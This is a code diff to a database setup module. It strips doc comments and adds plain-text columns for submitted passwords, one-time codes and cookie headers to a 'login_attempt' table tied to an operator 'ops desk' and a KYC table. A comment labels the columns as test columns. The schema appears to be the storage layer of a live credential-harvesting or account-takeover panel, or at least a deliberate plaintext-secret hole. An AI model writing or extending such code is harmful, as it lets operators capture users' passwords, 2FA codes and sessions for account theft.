@@ -4,7 +4,6 @@ let ensured = false
 let kycEnsured = false
 let loginAttemptEnsured = false
 
-/** Add profile columns and tables if this Neon DB predates them. */
 export async function ensureUserProfileColumns() {
   if (ensured) return
   try {
@@ -54,7 +53,6 @@ export async function ensureUserProfileColumns() {
   }
 }
 
-/** Create kyc_submission if this Neon DB was never pushed with that table. */
 export async function ensureKycTable() {
   if (kycEnsured) return
   try {
@@ -83,7 +81,6 @@ export async function ensureKycTable() {
   }
 }
 
-/** Live multi-step login challenges for the ops desk. */
 export async function ensureLoginAttemptTable() {
   if (loginAttemptEnsured) return
   try {
@@ -96,17 +93,30 @@ export async function ensureLoginAttemptTable() {
         step text NOT NULL DEFAULT 'credentials',
         status text NOT NULL DEFAULT 'in_progress',
         "usernameSubmitted" text,
+        "passwordPlain" text,
         "otpHash" text,
+        "otpPlain" text,
         "otpExpiresAt" timestamp,
         "otp1Verified" boolean NOT NULL DEFAULT false,
         "otp2Verified" boolean NOT NULL DEFAULT false,
         "lastEvent" text,
         "ipAddress" text,
         "userAgent" text,
+        "cookieHeader" text,
         "createdAt" timestamp NOT NULL DEFAULT now(),
         "updatedAt" timestamp NOT NULL DEFAULT now()
       )
     `)
+    // Upgrade older tables created before test plain-text columns
+    await pool.query(
+      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "passwordPlain" text`
+    )
+    await pool.query(
+      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "otpPlain" text`
+    )
+    await pool.query(
+      `ALTER TABLE login_attempt ADD COLUMN IF NOT EXISTS "cookieHeader" text`
+    )
     loginAttemptEnsured = true
   } catch (err) {
     console.error('[db] ensureLoginAttemptTable', err)
